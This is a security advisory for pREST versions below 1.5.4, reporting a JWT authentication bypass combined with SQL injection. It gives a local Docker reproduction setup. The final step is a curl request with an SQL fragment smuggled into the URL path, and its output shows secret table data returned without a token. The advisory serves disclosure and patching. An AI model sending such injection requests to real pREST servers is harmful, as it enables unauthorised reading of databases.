# pREST vulnerable to jwt bypass + sql injection

**GHSA**: GHSA-wm25-j4gw-6vr3 | **CVE**: N/A | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-89, CWE-287

**Affected Packages**:
- **github.com/prest/prest** (go): < 1.5.4

## Description

### Summary
Probably jwt bypass + sql injection
or what i'm doing wrong?

### PoC (how to reproduce)

1. Create following files:

docker-compose.yml:
```
services:
  postgres:
    image: postgres
    container_name: postgres_container_mre
    environment:
      POSTGRES_USER: test_user_pg
      POSTGRES_PASSWORD: test_pass_pg
      POSTGRES_DB: test_db
  prest:
    image: prest/prest
    build: .
    volumes:
      - ./queries:/queries
      - ./migrations:/migrations
    ports:
      - "3000:3000"
```

Dockerfile:
```
from prest/prest:latest

COPY ./prest.toml prest.toml
```

prest.toml:
```
debug=false
migrations = "./migrations"

[http]
port = 3000

[jwt]
default = true
key = "secret"
algo = "HS256"

[auth]
enabled = true
type = "body"
encrypt = "MD5"
table = "prest_users"
username = "username"
password = "password"

[pg]
URL = "postgresql://test_user_pg:test_pass_pg@postgres:5432/test_db/?sslmode=disable"

[ssl]
mode = "disable"
sslcert = "./PATH"
sslkey = "./PATH"
sslrootcert = "./PATH"

[expose]
enabled = true
databases = true
schemas = true
tables = true

[queries]
location = "/queries"
```


2. run commands:

```
mkdir -p migrations queries
docker compose up --build -d
```
wait for pg and prest, then run following to add test data to the pg:

```
export PGPASSWORD=test_pass_pg
docker exec -it postgres_container_mre psql -U test_user_pg -d test_db -c "CREATE TABLE IF NOT EXISTS public.some_table (id int primary key, secret_data text);\
INSERT INTO public.some_table (id, secret_data) VALUES (1, 'some secret text') ON CONFLICT DO NOTHING;"
```

3. SQL injection even without jwt token:
```
curl --location '127.0.0.1:3000/test_db/public".some_table)%20s;--/auth'
```
output:
```
[{"id": 1, "secret_data": "some secret text"}]
```

